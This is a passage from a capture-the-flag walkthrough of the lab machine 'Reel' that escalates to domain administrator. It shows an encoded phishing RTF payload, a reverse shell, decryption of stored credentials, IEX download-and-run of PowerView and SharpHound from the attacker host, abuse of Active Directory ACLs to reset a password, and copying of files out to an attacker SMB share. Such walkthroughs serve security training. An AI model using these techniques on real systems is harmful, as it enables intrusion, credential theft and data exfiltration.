 -> MTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMGE0MDAwMDAwZTBjOWVhNzlmOWJhY2UxMThj
 -> ODIwMGFhMDA0YmE5MGI4YzAwMDAwMDY4MDA3NDAwNzQwMDcwMDAzYTAwMmYwMDJmMDAzMTAwMzAw
 -> MDJlMDAzMTAwMzAwMDJlMDAzMTAwMzQwMDJlMDAzODAwMzEwMDJmMDA0ZDAwNjEwMDZlMDA3NTAw
 -> NjEwMDZjMDAyZTAwNjgwMDc0MDA2MTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA3OTU4ODFmNDNiMWQ3ZjQ4YWYyYzgyNWRjNDg1Mjc2
 -> MzAwMDAwMDAwYTVhYjAwMDBmZmZmZmZmZjA2MDkwMjAwMDAwMDAwMDBjMDAwMDAwMDAwMDAwMDQ2
 -> MDAwMDAwMDBmZmZmZmZmZjAwMDAwMDAwMDAwMDAwMDA5MDY2NjBhNjM3YjVkMjAxMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTAwMjAzMDAwZDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAKMDEwNTAwMDAwMDAwMDAwMH0K
 -> e1xyZXN1bHQge1xydGxjaFxmY3MxIFxhZjMxNTA3IFxsdHJjaFxmY3MwIFxpbnNyc2lkMTk3OTMy
 -> NCB9fX19CntcKlxkYXRhc3RvcmUgfQp9Cg==
 ->
 -> ------=_MIME_BOUNDARY_000_30115--
 ->
 ->
 -> .
<-  250 Queued (12.156 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

Web activity from `nico` downloading the RTF and HTA files:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.1.151 - - [11/Nov/2021 17:48:59] "GET /Manual.hta HTTP/1.1" 200 -
10.129.1.151 - - [11/Nov/2021 17:49:01] "GET /Manual.ps1 HTTP/1.1" 200 -
```

Catch the reverse shell as `nico` and grab the user flag.

```bash
listening on [any] 443 ...
connect to [10.10.14.81] from (UNKNOWN) [10.129.1.151] 49395
PS C:\users\nico\desktop> dir c:\users\nico\desktop\user.txt


    Directory: C:\users\nico\desktop


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-ar--        28/10/2017     00:40         32 user.txt
```

---

## `tom`'s Credentials

There's an interesting XML file on `nico`'s desktop.

```powershell
PS C:\users\nico\desktop> cat cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

It appears to be a PowerShell `PSCredential` object for a user `htb\tom` serialized into XML. Deserialize it into a usable `PSCredential` object.

```powershell
PS C:\users\nico\desktop> $cred = Import-Clixml cred.xml
PS C:\users\nico\desktop> $cred

UserName                                                                                                       Password
--------                                                                                                       --------
HTB\Tom                                                                                    System.Security.SecureString

```

Use the commands from [this StackOverflow post](https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text) to recover `htb\tom`'s plaintext password.

```powershell
PS C:\users\nico\desktop> $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($cred.Password)
PS C:\users\nico\desktop> [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
1ts-mag1c!!!
```

`htb\tom`'s password is `1ts-mag1c!!!`. Use this credential to access the machine via SSH.

```bash
$ ssh tom@10.129.1.151
Enter password:
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

tom@REEL C:\Users\tom>
```

---

## Domain Enumeration as `tom`

`tom`'s Desktop contains an interesting folder, `AD Audit`, that contains the following note:

```powershell
PS C:\Users\tom\Desktop\AD Audit> cat note.txt
Findings:

Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).

Maybe we should re-run Cypher query against other groups we've created.
```

This seems to hint that there's a possible attack path from a domain user to some other high privilege group.

### Domain Controllers

```powershell
PS C:\users\nico> Get-ADDomainController


ComputerObjectDN           : CN=REEL,OU=Domain Controllers,DC=HTB,DC=LOCAL
DefaultPartition           : DC=HTB,DC=LOCAL
Domain                     : HTB.LOCAL
Enabled                    : True
Forest                     : HTB.LOCAL
HostName                   : REEL.HTB.LOCAL
InvocationId               : 84ca9046-73ea-4bbc-bd37-6fc9965c5efc
IPv4Address                : 10.129.1.151
IPv6Address                : dead:beef::191
IsGlobalCatalog            : True
IsReadOnly                 : False
LdapPort                   : 389
Name                       : REEL
NTDSSettingsObjectDN       : CN=NTDS Settings,CN=REEL,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,D
                             C=HTB,DC=LOCAL
OperatingSystem            : Windows Server 2012 R2 Standard
OperatingSystemHotfix      :
OperatingSystemServicePack :
OperatingSystemVersion     : 6.3 (9600)
OperationMasterRoles       : {SchemaMaster, DomainNamingMaster, PDCEmulator, RIDMaster...}
Partitions                 : {DC=ForestDnsZones,DC=HTB,DC=LOCAL, DC=DomainDnsZones,DC=HTB,DC=LOCAL,
                             CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL, CN=Configuration,DC=HTB,DC=LOCAL...}
ServerObjectDN             : CN=REEL,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=HTB,DC=LOCAL
ServerObjectGuid           : c404d18f-d79a-4c23-9020-dd88ac309214
Site                       : Default-First-Site-Name
SslPort                    : 636
```

### Domain Users

```powershell
PS C:\Users\tom> $pv = (New-Object Net.Webclient).DownloadString("http://10.10.14.81/PowerView.ps1")
PS C:\Users\tom> IEX $pv; Get-DomainUser | select samaccountname

samaccountname
--------------
Administrator
Guest
krbtgt
nico
tom
SM_dccf830a58da45dbb
SM_ff493709e894499a8
SM_139a5eb6ab994638a
SM_8257963a642b41bb9
claire
herman
brad
julia
ranj
brad_da
claire_da
mark
rosie
```

### Domain Computers

```powershell
PS C:\Users\tom> IEX $pv; Get-DomainComputer


pwdlastset                    : 11/12/2021 5:14:12 AM
logoncount                    : 1066
msds-generationid             : {100, 103, 171, 175...}
serverreferencebl             : CN=REEL,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=HTB,DC=LOCAL
badpasswordtime               : 1/1/1601 12:00:00 AM
distinguishedname             : CN=REEL,OU=Domain Controllers,DC=HTB,DC=LOCAL
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 11/12/2021 5:14:23 AM
name                          : REEL
objectsid                     : S-1-5-21-2648318136-3688571242-2924127574-1001
samaccountname                : REEL$
localpolicyflags              : 0
admincount                    : 1
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 11/12/2021 5:14:23 AM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2012 R2 Standard
instancetype                  : 4
msdfsr-computerreferencebl    : CN=REEL,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=HTB,DC=LOCAL
objectguid                    : 95f1dc5a-15fa-42ee-bcea-41c74d7bfbd0
operatingsystemversion        : 6.3 (9600)
lastlogoff                    : 1/1/1601 12:00:00 AM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
dscorepropagationdata         : {1/18/2018 10:29:44 PM, 11/16/2017 11:46:10 PM, 11/16/2017 11:30:18 PM, 11/16/2017 11:02:05
                                PM...}
serviceprincipalname          : {exchangeRFR/REEL, exchangeRFR/REEL.HTB.LOCAL, exchangeMDB/REEL.HTB.LOCAL, exchangeMDB/REEL...}
usncreated                    : 12293
lastlogon                     : 11/12/2021 5:14:24 AM
badpwdcount                   : 0
cn                            : REEL
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
whencreated                   : 10/24/2017 8:39:13 PM
primarygroupid                : 516
iscriticalsystemobject        : True
msds-supportedencryptiontypes : 28
usnchanged                    : 532619
ridsetreferences              : CN=RID Set,CN=REEL,OU=Domain Controllers,DC=HTB,DC=LOCAL
dnshostname                   : REEL.HTB.LOCAL
```

### Domain Groups

```powershell
PS C:\Users\tom> IEX $pv; Get-DomainGroup | select sam
accountname

samaccountname
--------------
WinRMRemoteWMIUsers__
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Incoming Forest Trust Builders
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Enterprise Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
DnsAdmins
DnsUpdateProxy
$831000-BCI3MP5FNBO5
Backup_Admins
AppLocker_Test
SharePoint_Admins
DR_Site
SQL_Admins
HelpDesk_Admins
Restrictions
All_Staff
MegaBank_Users
Finance_Users
HR_Team
```

### Domain Graph

On the attacking machine, serve the PowerShell BloodHound collector via HTTP. Initiate the collection and output the results on the attacking machine's SMB share.

```powershell
PS C:\Users\tom> IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.81/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All -Stealth -NoSaveCache -OutputDirectory \\10.10.14.81\tgihf\
------------------------------------------------
Initializing SharpHound at 7:13 AM on 11/12/2021
------------------------------------------------

Updated Collection Methods to Reflect Stealth Options
[-] Removed LoggedOn Collection
[-] Removed RDP Collection
[-] Removed DCOM Collection
[-] Removed PSRemote Collection
[-] Removed LocalAdmin Collection
[+] Added GPOLocalGroup

Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, SPNTargets, Container, GPOLocalGroup

[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
[+] Finding Stealth Targets from LDAP Properties

Status: 0 objects finished (+0) -- Using 133 MB RAM
Status: 84 objects finished (+84 42)/s -- Using 139 MB RAM
Enumeration finished in 00:00:02.8091862
Compressing data to \\10.10.14.81\tgihf\20211112071327_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 7:13 AM on 11/12/2021! Happy Graphing!
```

Import the collected data into BloodHound and investigate the graphs.

#### `nico`

Analysis of the user `nico` reveals that he is both in the `Print Operators` group and that he has `WriteOwner` permission on the user account `Herman`. He is also the member of several other non-standard groups.

![](images/Pasted%20image%2020211112002815.png)

#### `tom`

Interestingly, analysis of the user `tom` reveals almost the exact same graph as that of `nico`.  He is both in the `Print Operators` group and he has `WriteOwner` permission on the user account `claire`. He is also the member of several other non-standard groups.

![](images/Pasted%20image%2020211112002849.png)

#### `claire`

`claire` is a member of several groups and has `GenericWrite` access to the `BACKUP_ADMINS` group. This is a non-standard group that could have elevated privileges.

![](images/Pasted%20image%2020211112003134.png)

There is also an account named `claire_da` that is a domain administrator. This account may be tangentially accessible via the `claire` account. There is also a `brad_da` account that is almost a domain administrator.

#### `herman`

`herman`, like `claire`, is a member of several groups and has `GenericWrite` acces to the `BACKUP_ADMINS` group. This s a non-standard group that could have elevated privileges.

![](images/Pasted%20image%2020211112003428.png)

---

## `tom` to `claire`

Since `tom` has `WriteOwner` permission to `claire`, change the owner of `claire`'s user account to `tom`, give `tom` `GenericAll` permission to `claire`, and then change `claire`'s password.

```powershell
PS C:\users\nico\Desktop> IEX (New-Object Net.Webclient).DownloadString("http://10.10.14.81/PowerView.ps1"); Set-DomainObjectOwner -Identity claire -OwnerIdentity tom; Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights All; $pass = ConvertTo-SecureString "blahblah123!" -AsPlain -Force; Set-DomainUserPassword -Identity claire -AccountPassword $pass
```

`claire`'s password is now `blahblah123!`. Access the machine with this credential via SSH.

```bash
$ ssh claire@10.129.1.151
Enter password:
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

claire@REEL C:\Users\claire>
```

---

## Privilege Escalation as `claire`

Prior BloodHound enumeration revealed that `claire` has `GenericWrite` access to the `BACKUP_ADMINS` group.

![](images/Pasted%20image%2020211112003134.png)

This privilege makes it possible for her to add arbitrary users to the group. Add `claire` herself to the group.

```powershell
PS C:\Users\claire> $pv = (New-Object Net.Webclient).DownloadString("http://10.10.14.81/PowerView.ps1")
PS C:\Users\claire> IEX $pv; Add-DomainGroupMember -Identity BACKUP_ADMINS -Members claire; Get-DomainGroupMember -Identity BACKUP_ADMINS

GroupDomain             : HTB.LOCAL
GroupName               : Backup_Admins
GroupDistinguishedName  : CN=Backup_Admins,OU=Groups,DC=HTB,DC=LOCAL
MemberDomain            : HTB.LOCAL
MemberName              : ranj
MemberDistinguishedName : CN=Ranj Singh,CN=Users,DC=HTB,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-2648318136-3688571242-2924127574-1136

GroupDomain             : HTB.LOCAL
GroupName               : Backup_Admins
GroupDistinguishedName  : CN=Backup_Admins,OU=Groups,DC=HTB,DC=LOCAL
MemberDomain            : HTB.LOCAL
MemberName              : claire
MemberDistinguishedName : CN=Claire Danes,CN=Users,DC=HTB,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-2648318136-3688571242-2924127574-1130
```

Logging out and logging back in via SSH allows the shell to take on the context of `claire`'s new membership in the group. Thanks to this access, `claire` now has access to `C:\Users\Administrator\Backup Scripts` folder.

```powershell
PS C:\users\administrator\desktop\Backup Scripts> ls


    Directory: C:\users\administrator\desktop\Backup Scripts


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---         11/3/2017  11:22 PM        845 backup.ps1
-a---         11/2/2017   9:37 PM        462 backup1.ps1
-a---         11/3/2017  11:21 PM       5642 BackupScript.ps1
-a---         11/2/2017   9:43 PM       2791 BackupScript.zip
-a---         11/3/2017  11:22 PM       1855 folders-system-state.txt
-a---         11/3/2017  11:22 PM        308 test2.ps1.txt
```

Exfiltrate the folder to the attacking machine via SMB for offline inspection.

```powershell
PS C:\users\administrator\desktop> cp -Recurse "Backup Scripts" \\10.10.14.81\tgihf
```

It appears the file `BackUpScript.ps1` contains a potential administrator's password:

```powershell
# admin password
$password="Cr4ckMeIfYouC4n!"
...
```

Attempt to use this password to access the machine as the domain administrator via SSH. Read the system flag.

```bash
$ ssh Administrator@10.129.1.151
Administrator@10.129.1.151's password:
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

administrator@REEL C:\Users\Administrator>dir Desktop
 Volume in drive C has no label.
 Volume Serial Number is CC8A-33E1

 Directory of C:\Users\Administrator\Desktop

21/01/2018  14:56    <DIR>          .
21/01/2018  14:56    <DIR>          ..
02/11/2017  21:47    <DIR>          Backup Scripts
28/10/2017  11:56                32 root.txt
               1 File(s)             32 bytes
               3 Dir(s)  15,742,193,664 bytes free
```
